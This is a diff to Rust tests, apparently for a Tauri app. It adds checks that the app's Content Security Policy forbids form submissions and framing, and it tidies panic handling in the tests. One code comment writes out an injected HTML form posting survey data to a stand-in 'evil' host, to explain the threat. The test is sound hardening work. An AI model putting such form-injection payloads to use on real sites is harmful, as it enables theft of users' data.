@@ -3036,7 +3036,7 @@ fn backdate(path: &std::path::Path, age: std::time::Duration) {
         .unwrap();
 }
 
-/// Comfortably past `Config::STALE_TEMP_AGE` (one hour).
+/// Comfortably past `atomic_write::STALE_TEMP_AGE` (one hour).
 const ABANDONED: std::time::Duration = std::time::Duration::from_secs(2 * 60 * 60);
 
 /// Every entry in `dir` whose name marks it as a `write_atomically` temp file.
@@ -3249,21 +3249,38 @@ fn test_csp_allows_the_tauri_ipc_origin() {
 
     let security = &conf["app"]["security"];
     for key in ["csp", "devCsp"] {
-        let policy = security[key]
-            .as_str()
-            .unwrap_or_else(|| panic!("app.security.{key} must be a string"));
+        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
+        // is deny-level here, and this module's `#[expect]` (config/mod.rs)
+        // covers `unwrap`/`expect` but deliberately not `panic!`.
+        let policy = security[key].as_str();
+        assert!(policy.is_some(), "app.security.{key} must be a string");
+        let policy = policy.unwrap();
 
         let connect_src = policy
             .split(';')
             .map(str::trim)
-            .find(|directive| directive.starts_with("connect-src"))
-            .unwrap_or_else(|| panic!("{key} must declare connect-src"));
+            .find(|directive| directive.starts_with("connect-src"));
+        assert!(connect_src.is_some(), "{key} must declare connect-src");
+        let connect_src = connect_src.unwrap();
 
         for origin in ["ipc:", "http://ipc.localhost"] {
             assert!(
                 connect_src.split_whitespace().any(|src| src == origin),
                 "{key}'s connect-src must list `{origin}` or every invoke falls \
                  back to the slower postMessage transport; got: {connect_src}"
+            );
+        }
+
+        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
+        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
+        // an injected `<form method=POST action=https://evil/>` posts survey data
+        // straight past it. Neither directive can break a Tauri app, so there is
+        // no reason for either to be absent.
+        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
+            assert!(
+                policy.split(';').map(str::trim).any(|d| d == directive),
+                "{key} must declare `{directive}` - it does not fall back to \
+                 default-src; got: {policy}"
             );
         }
     }
